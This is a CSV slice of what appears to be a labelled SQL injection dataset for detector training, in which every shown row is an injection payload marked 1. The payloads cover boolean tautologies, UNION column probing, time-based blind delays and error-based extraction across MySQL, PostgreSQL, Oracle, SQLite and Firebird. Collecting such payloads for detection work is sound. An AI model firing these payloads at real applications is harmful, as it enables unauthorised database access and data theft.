row_index,payload_norm,label,sqli_type_hint
4080,-3062' ) ) or 6872 = 6872 and ( ( 'uzth' like 'uzth,1,
4081,"-1407 where 1186 = 1186 union all select 1186,1186,1186,1186,1186--",1,
4082,"-1370' ) ) ) or elt ( 1032 = 1032,3623 ) and ( ( ( 'xmrg' = 'xmrg",1,
4083,"1%"" and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ""%"" = """,1,
4084,"-9509 ) union all select 1193,1193,1193#",1,
4085,"1"" ) ) as azak where 4911 = 4911",1,
4086,"1 where 2267 = 2267 and 6537 = dbms_pipe.receive_message ( chr ( 76 ) ||chr ( 116 ) ||chr ( 117 ) ||chr ( 65 ) ,5 ) --",1,
4087,"1' ) ) ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( ( ( 'qpuy' = 'qpuy",1,
4088,"1' where 8837 = 8837 and 5556 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
4089,"1"" ) ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( ( ""auyv"" = ""auyv",1,
4090,1' ) ) and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --,1,
4091,1' ) ) ) and 4595 = 4595#,1,
4092,"1 ) or 7427 = dbms_pipe.receive_message ( chr ( 116 ) ||chr ( 87 ) ||chr ( 90 ) ||chr ( 109 ) ,5 ) --",1,
4093,"1"" ) as ymto where 3453 = 3453",1,
4094,"-7320"" ) where 3907 = 3907 union all select 3907,3907--",1,
4095,"1 procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select ( case when ( 5840 = 5840 ) then 1 else 0 end ) ) ,0x717a767a71 ) ) ,1 ) # mafe",1,
4096,"-1663' or elt ( 1032 = 1032,3623 ) and 'yqaj' like 'yqaj",1,
4097,-3578' ) ) ) order by 1--,1,
4098,"1%' ) ) ) union all select null,null,null#",1,
4099,"select sleep ( 5 ) and ( ""tlbj"" like ""tlbj",1,
4100,"1' ) ) ) or row ( 1045,7562 ) > ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 1045 = 1045,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from ( select 8488 union select 5584 union select 3051 union select 1210 ) a group by x ) and ( ( ( 'drvk' like 'drvk",1,
4101,"1"" ) or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and ( ""zbwn"" like ""zbwn",1,
4102,"1' in boolean mode ) or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) #",1,
4103,"-3834' ) ) ) union all select 8313,8313--",1,
4104,-8248 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ),1,
4105,"1 ) ) as juoe where 9994 = 9994 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
4106,"1' where 8950 = 8950 or 1022 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
4107,1' where 3701 = 3701 and 2006 = 2006,1,
4108,"-1668"" ) ) ) or 9323 = 9323#",1,
4109,"1 ) or elt ( 6272 = 6272,sleep ( 5 ) )",1,
